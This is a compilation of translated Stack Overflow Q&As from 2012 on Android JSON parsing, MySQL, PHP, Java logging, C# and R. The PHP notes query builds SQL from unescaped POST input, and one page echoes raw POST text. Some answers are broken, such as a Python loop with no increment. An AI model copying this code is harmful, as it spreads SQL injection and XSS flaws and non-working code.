11-09 20:47:04.170: I/AllNotes >> jSon >>(429): {"notes":{"3":{"note_subject":"dshjdsfjsdfsdhf","note_id":"4","note_date":"0000-00-00"},"2":{"note_subject":"dshjdsfjsdfsdhf","note_id":"3","note_date":"0000-00-00"},"1":{"note_subject":"dshjdsfjsdfsdhf","note_id":"2","note_date":"0000-00-00"},"0":{"note_subject":"dshjdsfjsdfsdhf","note_id":"1","note_date":"0000-00-00"},"7":{"note_subject":"dshjdsfjsdfsdhf","note_id":"8","note_date":"1391\/8\/19"},"6":{"note_subject":"dshjdsfjsdfsdhf","note_id":"7","note_date":""},"5":{"note_subject":"dshjdsfjsdfsdhf","note_id":"6","note_date":""},"4":{"note_subject":"dshjdsfjsdfsdhf","note_id":"5","note_date":""}},
"success":"1"} 
```

我的 JSONParser 类是：

```
package ir.mohammadi.android.nightly;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import android.util.Log;

public class JSONParser {
    static InputStream is = null;
    static JSONObject jObj = null;
    static String json = null;

    public JSONParser() {

    }

    public JSONObject getJSONFromUrl(String url, List<NameValuePair> params) {

        // Make HTTP connection
        try {

            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();

            Log.i("Input stream >> ", is.toString());

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {

            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    is, "UTF-8"), 8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }
            is.close();
            json = sb.toString();

            Log.i("JSON string builder >> ", json.toString());
        } catch (Exception e) {
            Log.e("Buffer Error", "Error converting result " + e.toString());
        }

        try {
            jObj = new JSONObject(json.substring(1, json.length()));
        } catch (JSONException e) {
            Log.e("JSON Parser", "Error parsing data " + e.toString());
        }
        return jObj;
    }
} 
```

错误是：`at notes of type org.json.JSONObject cannot be converted to JSONArray`

在列表视图中显示 json 的代码是：

```
package ir.mohammadi.android.nightly;

import java.util.ArrayList;
import java.util.HashMap;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.ListActivity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

public class AllNotes extends ListActivity {

    ProgressDialog pDialog;

    ArrayList<HashMap<String, String>> noteList;

    JSONArray notes = null;

    JSONObject jSon = null;

    private static String KEY_SUCCESS = "success";
    private static String KEY_ERROR_MSG = "error_message";
    private static String KEY_NOTE_ID = "note_id";
    private static String KEY_NOTE_SUBJECT = "note_subject";
    private static String KEY_NOTE_DATE = "note_date";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.note_list);

        noteList = new ArrayList<HashMap<String, String>>();
        new LoadAllNotes().execute();
        ListView lv = getListView();

        lv.setOnItemClickListener(new OnItemClickListener() {
            public void onItemClick(AdapterView<?> parent, View view,
                    int position, long id) {

                String note_id = ((TextView) view
                        .findViewById(R.id.list_lbl_id)).getText().toString();
                Intent i = new Intent(getApplicationContext(), NoteDetail.class);
                i.putExtra("note_id", note_id);
                startActivityForResult(i, 100);
            }
        });
    }

    public class LoadAllNotes extends AsyncTask<String, String, String> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(AllNotes.this);
            pDialog.setMessage("لطفا صبر کنید...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

        protected String doInBackground(String... args) {

            UserFunctions userFunctions = new UserFunctions();

            jSon = userFunctions.getAllNotes("12");

            Log.i("AllNotes >> jSon >>", jSon.toString());

            return null;
        }

        protected void onPostExecute(String file_url) {
            pDialog.dismiss();
            try {
                if (jSon.has(KEY_SUCCESS)) {
                    String success = jSon.getString(KEY_SUCCESS);
                    if (success.equals("1")) {
                        notes = jSon.getJSONArray("notes");
                        for (int i = 0; i < notes.length(); i++) {
                            JSONObject c = notes.getJSONObject(i);

                            String id = c.getString(KEY_NOTE_ID);
                            String subject = c.getString(KEY_NOTE_SUBJECT);
                            String date = c.getString(KEY_NOTE_DATE);

                            HashMap<String, String> map = new HashMap<String, String>();
                            map.put(KEY_NOTE_ID, id);
                            map.put(KEY_NOTE_SUBJECT, subject);
                            map.put(KEY_NOTE_DATE, date);

                            noteList.add(map);
                        }

                    }
                } else {

                    finish();
                    Toast.makeText(getApplicationContext(),
                            jSon.getString(KEY_ERROR_MSG), Toast.LENGTH_SHORT)
                            .show();

                    Log.i("AllNotes >> No nightly >>", "...");

                    Intent i = new Intent(getApplicationContext(), login.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(i);
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

            runOnUiThread(new Runnable() {

                public void run() {
                    ListAdapter adapter = new SimpleAdapter(AllNotes.this,
                            noteList, R.layout.list_item, new String[] {
                                    KEY_NOTE_ID, KEY_NOTE_SUBJECT,
                                    KEY_NOTE_DATE }, new int[] {
                                    R.id.list_lbl_id, R.id.list_lbl_subject,
                                    R.id.list_lbl_date });
                    setListAdapter(adapter);
                }
            });
        }
    }
} 
```

php代码是：

```
public function getNotesList($user_id)
    {
        $result = mysql_query("SELECT `id`, `note_subject`, `note_date` FROM `tbl_notes` WHERE `user_id` = '$user_id'");

        if (mysql_num_rows($result) > 0) {

            $response = array();
            $response["success"] = "1";

            $response["notes"] = array();

            while ($row = mysql_fetch_array($result)) {
                $note = array();
                $note["note_id"] = $row["id"];
                $note["note_subject"] = $row["note_subject"];
                $note["note_date"] = $row["note_date"];

                array_push($response["notes"], $note);
            }
            return $response;
        }
    } 
```

和

```
if ($tag == 'getNotesList') {

                            $user_id = $_POST['user_id'];
                            $result = $db->getNotesList($user_id);

                            if ($result) {
                                error_log("Index getNotesList Json >>" . json_encode($result) . "\r\n", 3,
                                    "Log.log");
                                echo json_encode($result, JSON_FORCE_OBJECT);
                            } else {
                                $response["error"] = "1";
                                $response["error_message"] = "no row";
                                echo json_encode($response, JSON_FORCE_OBJECT);
                            }
                        } 
```

我怎样才能解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:17:50.950

采用

```
 JSONObject notes = jSon.getJSONObject("notes"); 
```

代替

```
JSONArray notes = jSon.getJSONArray("notes");` 
```

因为您的 json String 是 JsonOject 的集合，所以它不包含任何 JsonArray。

您可以在解析它以了解 Json String 的结构之前使用以下 json 检查器站点

[http://jsonviewer.stack.hu/](http://jsonviewer.stack.hu/)

# mysql - mysql select with a LIMIT by field value

> ID：13313391
> 
> 赞同：0
> 
> 时间：2012-11-09T17:54:28.883
> 
> 标签：mysql

> **可能重复：**
> [mysql：在 GROUP BY 中使用 LIMIT 来获得每组 N 个结果？](https://stackoverflow.com/questions/2129693/mysql-using-limit-within-group-by-to-get-n-results-per-group)

我试过`group by`了，但是每个account_id我只会得到1个，我想要每个account_id 10个。这就是我要找的东西。

```
SELECT id,account_id FROM whatever {LIMIT to 10 of each account_id} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:02:14.923

您可以对每个 account_id、id 组使用 rank

例子：

```
SELECT id,account_id FROM (
SELECT id,account_id,
   @acrank:=CASE 
               WHEN @aid <> id THEN 1 
               ELSE @acrank+1 END AS rn,
   @id:=id AS id_set
FROM
  (SELECT @acrank:= -1) nr,
  (SELECT @id:= -1) n,
  (SELECT * FROM Test ORDER BY id, account_id) t
  ) x WHERE rn < 11 
```

# javascript - 如果单击链接，则创建 cookie，下次访问时重定向到单击的链接

> ID：13313392
> 
> 赞同：7
> 
> 时间：2012-11-09T17:54:36.343
> 
> 标签：javascript, jquery, expressionengine

网站有两个部分；“无处不在”和“洛杉矶”。
默认为“无处不在”部分。

如果访问者单击“LA”部分链接并且当他们在另一次访问中返回主站点时，他们将被重定向到该“LA”部分，我将如何创建 cookie？

我试过改变这个脚本；[http://www.javascriptsource.com/cookies/cookie-redirect.html](http://www.javascriptsource.com/cookies/cookie-redirect.html)

它不是复选框，而是一个链接，并且只有一个。但似乎不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:28:03.783

我通常做的是创建一个条件，并在里面创建一个带有 cookie 的嵌入。我也倾向于使用这个附加组件：[http ://devot-ee.com/add-ons/cookies](http://devot-ee.com/add-ons/cookies)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-10T02:44:32.090

泰德，

要设置 cookie，您将要使用 javascript，使用 LA 部分链接上的单击处理程序。[如果您需要一些关于在 javascript 中设置 cookie 的帮助，在http://www.quirksmode.org/js/cookies.html](http://www.quirksmode.org/js/cookies.html)上有一篇很好的介绍性文章，它不是最新的，但仍处于完整的工作状态。

设置 cookie 后，您将切换到使用 EE 插件之一，以便您可以在页面加载时检查它是否存在于模板中（可能在嵌入或片段模板中）。如果您找到 cookie，那么您可以使用标准的 EE 重定向语法将访问者发送到相关部分。

# php - 将变量发布到外部页面并读取它

> ID：13313393
> 
> 赞同：-1
> 
> 时间：2012-11-09T17:54:41.600
> 
> 标签：php, curl

假设我们有第 1 页：

```
<?php
$text=$_POST['text'];
echo 'You wrote "' . $text . '".';
?> 
```

和第 2 页，它接受用户输入，将其发布到第 1 页，并获取页面 ( `You wrote (input).`)。我不太确定如何做到这一点：谷歌搜索（或者更好的是，stackoverflowing）一段时间，我发现[了这个](https://stackoverflow.com/questions/4481955/how-to-send-redirect-page-pass-variables-as-post-variables-from-a-php-script)问题，它解释了如何将变量发布到另一个页面，而不是如何获取页面的代码。那么，如何做到这两点呢？

**编辑**：实际情况的一个例子。用户输入号码`245`。我得到*号码，将它传递给[这个**外部**页面](http://www.numberempire.com/numberfactorizer.php)，得到页面*，检索结果（`5*7*7`）并显示它。*斜体字*是我需要的部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:08:30.823

我建议使用[curl](http://php.net/manual/en/book.curl.php)发布数据，然后您可能需要[解析返回的 HTML](https://stackoverflow.com/questions/3577641/how-to-parse-and-process-html-with-php)。

这是一篇关于[如何使用 cURL 发布的博客文章](http://davidwalsh.name/curl-post)。我将离开使用 google 来查找使用 PHP 解析 HTML 的示例，作为读者练习。. .

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:07:58.017

第 1 页：

```
<form method="post" action="page2">
<input name="input" type="text"/>
<input type="submit" value="sendtopage2"/>
</form> 
```

第2页：

```
<?php
$text=$_POST['input'];
echo 'You wrote "' . $text . '".';
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T19:04:42.047

使用 cURL 的工作示例：

```
$function="sin(x)";
$var="x";
$url='http://www.numberempire.com/integralcalculator.php';
echo '<base href="' . $url . '">'; // Fixes broken relative links
$Curl_Session = curl_init($url);
curl_setopt ($Curl_Session, CURLOPT_POST, 1);
curl_setopt ($Curl_Session, CURLOPT_POSTFIELDS, "function=$function&var=$var");
curl_setopt ($Curl_Session, CURLOPT_FOLLOWLOCATION, 0);
$content=curl_exec($Curl_Session);
curl_close ($Curl_Session); 
```

# java - Java FileHandler 使用 24 小时时间

> ID：13313395
> 
> 赞同：0
> 
> 时间：2012-11-09T17:55:02.230
> 
> 标签：java, filehandler

我有一个 FileHandler 设置：

```
Logger logger = Logger.getLogger(this.class.getName());
FileHandler handler = new FileHandler(myFile, true);
handler.setFormatter(new SimpleFormatter());
logger.addHandler(handler);
logger.setUseParentHandlers(false); 
```

但是我的服务器是 UTC，所以在我的日志文件中，时间戳看起来像：`Nov 9, 2012 5:12:17 PM`

这在紧要关头很难理解，所以我想知道是否可能

1）将其转换为 24 小时制，所以至少我会看到`17:12:17`而不是`5:12:17PM` 2）改为使用不同的时区

我认为这可能与我如何设置格式化程序有关，但我只是不知道如何设置。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:05:47.333

我建议您阅读[SimpleFormatter.format()的 javadoc，您可以通过](http://docs.oracle.com/javase/7/docs/api/java/util/logging/SimpleFormatter.html#format%28java.util.logging.LogRecord%29)[应用程序日志配置文件](http://docs.oracle.com/javase/7/docs/technotes/guides/logging/overview.html#a1.8)中的 java.util.logging.SimpleFormatter.format 属性指定您自己的格式。

默认属性文件是 <Java home>\jre7\lib\logging.properties。复制它并将其放在您想要的任何位置。

[Java Logging Overview](http://docs.oracle.com/javase/7/docs/technotes/guides/logging/overview.html)也是一本不错的读物。

以下代码

```
System.setProperty(
   "java.util.logging.SimpleFormatter.format", "%4$s: %5$s [%1$tc]%n" );
Logger l = Logger.getLogger("");
l.warning( "Hello" ); 
```

输出

```
WARNING: Hello [ven. nov. 09 20:26:30 CET 2012] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T19:24:19.317

我可以通过使用我找到的示例创建自己的格式化程序来使其工作：

[自定义记录器格式化程序](http://www.kodejava.org/examples/458.html)

# c# - 如何在 Mono IDE 中使用 C# 设置命令行参数。

> ID：13313398
> 
> 赞同：2
> 
> 时间：2012-11-09T17:55:08.673
> 
> 标签：c#, mono

嗨，我正在尝试使用 MONO IDE 使用 C# 发送两个参数，但我无法做到这一点。我收到以下错误。

```
Unhandled Exception: System.IndexOutOfRangeException: Array index is out of range.
  at Command.Main (System.String[] args) [0x00000] in /media/EE76D9DA76D9A39D/C#/Command.cs:6 
[ERROR] FATAL UNHANDLED EXCEPTION: System.IndexOutOfRangeException: Array index is out of range.
  at Command.Main (System.String[] args) [0x00000] in /media/EE76D9DA76D9A39D/C#/Command.cs:6 
```

这是我的程序：

```
using System;
class Command
{
    static void Main(String[] args)
    {
        Console.WriteLine("Hi {0} , Welcome to {1}",args[0],args[1]);
    }
} 
```

提前致谢 。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-10T12:09:34.633

我相信你的意思是 MonoDevelop 作为 IDE。如果是这样，则转到您的项目选项（通过右键单击项目并选择选项或通过项目菜单和（项目名称）选项位置），然后转到运行>常规，您可以将所需的参数放在参数中编辑框。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:58:56.927

你怎么称呼这个程序？

如果您只是在 IDE 中点击 Run，它将在没有参数的情况下运行。然后 args 将是一个空字符串数组 ( `string[0]`)，因此您会遇到异常。

尝试从命令行调用它并传递两个参数。

# php - 可能的错误：Facebook 事件 API eid 表值以原始小数点返回

> ID：13313401
> 
> 赞同：0
> 
> 时间：2012-11-09T17:55:22.493
> 
> 标签：php, facebook, facebook-graph-api, facebook-events

几个月前，我构建了一个自定义的 wordpress 小部件，它只提取用户的 facebook 事件、样式并将其显示在侧边栏中。事件仍然显示良好 - 除了链接现在转到 facebook 错误页面。所以我检查了回显的网址，这就是我得到的：

[https://www.facebook.com/events/4.3772330960996E+14](https://www.facebook.com/events/4.3772330960996E+14)

显然，以 events/ 结尾的 url 是硬编码的，后面的数字是 echo 是 for 循环。它已经干净工作了大约 6 个月。

起初我以为它可能正在返回一个正在以某种方式转换的整数.. 但我检查了来自 facebook.com 的实际事件 ID，这就是：

437723309609959

我认为 fb api 将小数点放在以前从未有过的地方。

澄清一下：我正在使用 PHP - 通过带有 CURL 的 GRAPH 使用 FQL。然后回显原始行信息。

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T07:37:15.917

`precision`在 php.ini 中或直接在代码中更改您的设置：

```
ini_set('precision', 20); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:23:57.357

您必须使用 32 位版本的 PHP，其中最大整数为 2147483647

尝试使用[printf](http://us3.php.net/manual/en/function.printf.php)而不是 echo：

```
printf('http://graph.facebook.com/events/%s', $eid); 
```

# php - preg_match_all() 的奇怪行为

> ID：13313403
> 
> 赞同：0
> 
> 时间：2012-11-09T17:55:42.097
> 
> 标签：php, regex, preg-match-all

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T17:58:50.563

Try adding the Unicode flag:

```
$regex = '@[۱]@u'; 
```

The reason for this is because `۱` is actually several bytes long. On it's own, it's harmless because those exact bytes are either the symbol, or the individual bytes being there coincidentally. However, in a character class any of the individual bytes may match any of the individual bytes in the other characters, which is does because they are close together in the map.

# java - eclipse AutoCompleteField 是否仅建议以输入文本开头的条目？

> ID：13313410
> 
> 赞同：3
> 
> 时间：2012-11-09T17:56:11.603
> 
> 标签：java, eclipse, eclipse-plugin, jface

我正在使用`org.eclipse.jface.fieldassist.AutoCompleteField`类来建议我的组合框选项。但它没有用，因为它只建议与开头输入的文本匹配的条目。

Java代码：

```
 ComboContentAdapter comboAdapter = new ComboContentAdapter();                    
   new  AutoCompleteField(branchCombo,comboAdapter,branchCombo.getItems()); 
```

例子 ：

组合框选项：

```
['ZMEDIA_TWITTER_MIGRATION_BRANCH','ZMEDIA_TWITTER_HOTFIX_BRANCH','ZMEDIA_FB_BRANCH']. 
```

如果我`TWITTER`在组合框中键入它什么都没有。它看起来像`TWITTER`组合框选项中的 with startswith 匹配。

有什么选项可以覆盖它吗？

感谢您

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-10T18:56:23.620

简单地说，没有。

但是，这可以通过在其方法中实现`org.eclipse.jface.fieldassist.IContentProposalProvider`和实现您的过滤逻辑来创建您自己的提案提供者来实现。`getProposals(String contents, int position)`

然后，只需将您的提案提供者添加到 a`ContentProposalAdapter`并调整组合框，如下所示：

```
MyContentProposalProvider provider = new  MyContentProposalProvider(combo.getItems());
ContentProposalAdapter adapter = new ContentProposalAdapter(combo, comboAdapter, provider, null, null);
adapter.setPropagateKeys(true);
adapter.setProposalAcceptanceStyle(ContentProposalAdapter.PROPOSAL_REPLACE); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-22T18:05:57.647

正如*[tkotisis](https://stackoverflow.com/users/618212/tkotisis)*所说，您可以实现自己的 IContentProposalProvider，如果您希望 Provider 提供包含用户键入的任何字符的所有提案，您可以使用我想出的这段代码。

**注意：**转换为 char 不是必须的，您也可以使用原始字节，但如果您想进一步处理您的 Provider，使用 char 会更容易！

```
IContentProposalProvider proposalProvider = new IContentProposalProvider() {

            @Override
            public IContentProposal[] getProposals(String contents, int position) {
                String[] props = new String[] { "Test0", "Test1", "Test2",
                        "Test3" }; // This is all your propsals.
                List<IContentProposal> validProposals = new ArrayList<IContentProposal>();
                for (String prop : props) {
                    contents = contents.substring(0, position);
                    for (byte b : contents.getBytes()) {
                        char c = (char) (b & 0xFF);
                        if (prop.indexOf(c) != -1) { // This is where it checks if the proposal contains the chars.
                            validProposals.add(new ContentProposal(prop));
                            break;
                        }
                    }
                }
                return validProposals.toArray(new IContentProposal[validProposals.size()]);
            }
        }; 
```

# python - 使用while循环迭代相同的数字

> ID：13313412
> 
> 赞同：0
> 
> 时间：2012-11-09T17:56:20.370
> 
> 标签：python

我刚刚开始学习while循环。

我正在尝试使用 while 循环将相同的数字迭代 10 次。

我想出了如何利用while循环来在它增加时停止在某个点

但是我不知道如何在不加 1 并设置限制的情况下停止在某个点。

这是我的代码

```
i = 1
total = 0
while i < 11:
    print i
    i += 1
    total = i + total
print total 
```

这打印

> 1,2,3,4,5,6,7,8,9,10,65

在单独的行中

我怎样才能修改这个结果？

> 1,1,1,1,1,1,1,1,1,1,10?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:57:59.457

只需打印一个文字`1`并添加`1`到总数中：

```
while i < 11:
    print 1
    i += 1
    total += 1 
```

您需要跟踪循环运行了多少次，使用`i`for 很好，但这确实意味着您需要在每次运行时增加它。

如果在每个循环期间，您只想在总数中*添加*一个，那么就这样做并且不要使用循环计数器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:01:28.897

```
i = 1
total = 0
res = []
while i < 11:
    res.append(1)
    i += 1
print ', '.join(res) +', '+ str(sum(res)) 
```

或用于：

```
vals = [1 for _ in range(10)]
print ', '.join(vals) +', '+ str(sum(vals)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:02:52.800

while 循环的重点是在某个条件为真时继续循环。似乎您想执行一个动作 n 次，然后显示执行该动作的次数。正如 Martijn 提到的，您可以通过打印文字来做到这一点。在更一般的意义上，您可能想要考虑将计数器与变量分开，例如：

```
count = 1
number = 3
while count <11:
  print number*count
print "While loop ran {0} times".format(count) 
```

# php - Symfony2 从 api 数据填充选择列表

> ID：13313415
> 
> 赞同：2
> 
> 时间：2012-11-09T17:56:42.273
> 
> 标签：php, forms, symfony

我必须从 Api 调用中填充选择列表。我尝试了几种方法都没有成功。

我认为最好的方法是实现 ChoiceListInterface。

有人已经做过了吗？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-10T08:19:13.063

扩展[LazyChoiceList](https://github.com/symfony/symfony/blob/master/src/Symfony/Component/Form/Extension/Core/ChoiceList/LazyChoiceList.php#L25)并实现[loadChoiceList](https://github.com/symfony/symfony/blob/master/src/Symfony/Component/Form/Extension/Core/ChoiceList/LazyChoiceList.php#L137)方法，例如

```
//ApiChoiceList.php
namespace Your\Namespace;
use Symfony\Component\Form\Extension\Core\ChoiceList\LazyChoiceList;
use Symfony\Component\Form\Extension\Core\ChoiceList\ChoiceList;

class ApiChoiceList extends LazyChoiceList 
{
    protected function loadChoiceList()
    {
        //fetch and process api data

        return new ChoiceList($choices, $labels);

    }
} 
```

然后在你`buildForm`的形式中，

```
$builder->add('fieldname', 'choice', array(
    'choice_list' => new Your\Namespace\ApiChoiceList(),
    //....
)); 
```

# log4net - log4net 缺少日期和扩展名

> ID：13313418
> 
> 赞同：0
> 
> 时间：2012-11-09T17:56:49.787
> 
> 标签：log4net

我刚刚在 VS2010 中通过 NuGet 下载了 log4net。Log4net 版本 1.2.11.0。

我的问题 - 我无法将日期或扩展名附加到文件名。

这是我的附加程序：

```
<appender name="ErrorAppender" type="log4net.Appender.RollingFileAppender">

  <file value="Logs\Error" />
  <appendToFile value="true" />
  <datePattern value=".yyyy-MM-dd.lo\g" />

  <rollingStyle value="Date" />
  <filter type="log4net.Filter.LevelRangeFilter">
    <acceptOnMatch value="true" />

    <levelMin value="ERROR" />
    <levelMax value="FATAL" />
  </filter>

  <layout type="log4net.Layout.PatternLayout">
    <conversionPattern
    value="%-5p %d %5rms %-22.22c{1} %-18.18M - %m%n" />
  </layout>

</appender> 
```

该文件在正确的目录 (./Logs) 中创建，名称为“Error”，没有扩展名。

我也试过 datePattern ".yyyy-MM-dd.\l\o\g"。

我访问过的其他 SO 问题都没有帮助。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T21:24:08.200

添加行

```
 <staticLogFileName value="false" /> 
```

有关详细信息，请参阅 [http://logging.apache.org/log4net/release/sdk/log4net.Appender.RollingFileAppender.StaticLogFileName.html](http://logging.apache.org/log4net/release/sdk/log4net.Appender.RollingFileAppender.StaticLogFileName.html)

# php - 从 BLOB 确定图像的 MIME 类型？

> ID：13313420
> 
> 赞同：2
> 
> 时间：2012-11-09T17:56:56.503
> 
> 标签：php, mysql, sql, gd, mime-types

我以二进制格式将数千张图像存储在数据库中。我想用 PHP GD 确定 MIME 类型，而不是使用表中的另一列。

在不读取和写入临时图像文件的情况下执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T17:59:35.470

您可以使用[getimagesizefromstring](http://www.php.net/manual/en/function.getimagesizefromstring.php)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-04-26T15:58:21.740

我知道这有点老了，但我一直在寻找一种解决方案来从 mysql 的 BLOB 上解决这个问题，这对我来说是有效的方式。我希望它也对其他人有所帮助。我不知道哪种方式最适合性能，但值得测试。

```
$finfo    = new finfo(FILEINFO_MIME);
$mimeType = $finfo->buffer($myBlobHere); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-02-23T10:05:58.733

OP 只询问图像类型。对于图像类型，`getimagesizefromstring()`效果很好，但`finfo`也适用于其他文件类型。不幸的是，`finfo`并非在所有服务器上都可用。它自 PHP 5.3.0 起就包含在内，但通常在 Windows 系统上被禁用。因此，我选择首先使用`getimagesizefromstring`，如果它无法检测到 mimetype，我检查`finfo`-class，如果它存在，我尝试 finfo。

这是组合解决方案：

```
$imagesize = getimagesizefromstring($blobVal);
if($imagesize!==false && isset($imagesize['mime']))
    $mimetype = $imagesize['mime'];
elseif(class_exists('finfo'))
{
    $finfo    = new finfo(FILEINFO_MIME);
    $mimetype = $finfo->buffer($blobVal);
}
else
    $mimetype = "application/octet-stream"; 
```

在这里，我使用默认的 mimetype 作为后备，您可能需要调整它。

**注意**：使用`finfo`, 您可能想要`FILEINFO_MIME_TYPE`代替`FILEINFO_MIME`，因为后者还包含编码，而`FILEINFO_MIME_TYPE`仅返回 mime 类型。就我而言，我`$mimetype`在 http 内容类型标头中使用，其中编码很有帮助。

# c++ - 为什么这个子类代码会导致运行时错误？

> ID：13313428
> 
> 赞同：2
> 
> 时间：2012-11-09T17:57:33.520
> 
> 标签：c++, oop

我有一个`A`要扩展的基类`X`。里面`A`还有另一个类，`B`。似乎没有定义虚拟方法，但我不明白为什么？

```
class A {
 public:
  class B {public: bool value;};

  A() {}
  B b_;
  void DoStuff(B& b);
 private:
  virtual void DoStuffImpl(B& b) = 0;
};

class X : public A {
 public:
  X() {}
  void Trigger();
 private:
  virtual void DoStuffImpl(B& b);
};

void A::DoStuff(B& b) {
     DoStuffImpl(b);
}

void X::Trigger() {
    DoStuff(b_);
}
void X::DoStuffImpl(B& b) {
    b.value = true;
}

int main(){
    X x;
    x.Trigger();
    return x.b_.value;
} 
```

PS 这是因为我的代码有不同的问题，但我什至无法让这个玩具示例工作，所以现在我有这个让我很好奇......

这是上面代码的链接，它正在编译并且无法运行：http: [//ideone.com/mBJ1Kg](http://ideone.com/mBJ1Kg)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-09T18:00:14.960

它运行良好。ideone 报告退出代码为 1 的“运行时错误”，因为您`1`从`main`. 非零返回码通常被认为是失败。

如果您注释掉您的`return x.b_.value`行并将其替换为，`return 0`那么[一切都很好](http://ideone.com/JXbXTj)。

您可以在其中放置一些`std::cout`行以查看发生了什么，并查看程序是否有效！:D

# android - 如何在 Android 应用程序资源管理器中设置应用程序的可见性

> ID：13313429
> 
> 赞同：1
> 
> 时间：2012-11-09T17:57:33.187
> 
> 标签：android

这是我将要做的一个简单**示例**
： - 您有一个名为“Words”的主应用程序。安装后，您在 Play Store 中搜索模块并安装两个，称为“Words：A”和“Words：B”。然后当您打开“Words”时，它将加载已安装的模块。但是每次添加模块时，手机都会像处理其他应用程序一样处理它，并且应用程序资源管理器中会出现一个图标。如果您安装了 26 个模块，那将会很混乱。我可以让这个模块在资源管理器中不可见吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:03:55.093

“模块”是什么意思？

我不确定我是否完全理解，但是，我认为您尝试做的事情可以使用 Intent Filters 来完成：

[http://developer.android.com/guide/components/intents-filters.html](http://developer.android.com/guide/components/intents-filters.html)

您的其他模块弹出的原因（如果我理解正确的话）是因为它们可以由应用程序资源管理器打开，因为它们有一个主要活动，其主要意图过滤器是

```
 <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter> 
```

这把它放在发射器中。取出 LAUNCHER 的意图过滤器，您的应用程序不应再出现在应用程序资源管理器中

如果您的模块不是应用程序，请不要将其放在 Google Play 商店中。通过您的应用程序从某处的托管服务器下载它。如果它打算成为一个图书馆，那就让它成为一个图书馆。如果它是一个框架，请改为将其导入您的代码中。

# r - 在 R 中创建重复函数调用的结果向量

> ID：13313432
> 
> 赞同：46
> 
> 时间：2012-11-09T17:57:48.267
> 
> 标签：r

我有一个`runif`用于计算某个值的函数，因此每次调用它时，结果都会略有不同。我想计算多次调用该函数的结果的平均值。

为此，最好使用重复函数调用的结果创建一个向量

有没有一种简单的惯用方法来创建重复函数调用的向量？我尝试

```
rep(my_function_call(), 10) 
```

但它只是调用函数一次并重复结果 10 次。我希望函数评估 10 次，以及结果的向量。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-11-09T17:59:11.303

`replicate`是你的朋友。看`?replicate`

```
replicate(10, my_function_call()) # this would be what you're looking for 
```

# c# - 该行不属于与此关系相同的 DataSet

> ID：13313433
> 
> 赞同：0
> 
> 时间：2012-11-09T17:57:50.987
> 
> 标签：c#, ado.net

```
DataSet customerOrders = new DataSet();
DataSet.CustomersDataTable customers = new DataSet.CustomersDataTable();
CustomersTableAdapter adapter = new CustomersTableAdapter();
adapter.Fill(customers);

DataSet.OrdersDataTable orders = new DataSet.OrdersDataTable();
OrdersTableAdapter oAdapter = new OrdersTableAdapter();
oAdapter.Fill(orders);

DataRelation relation = (DataRelation)customerOrders.Relations[0];

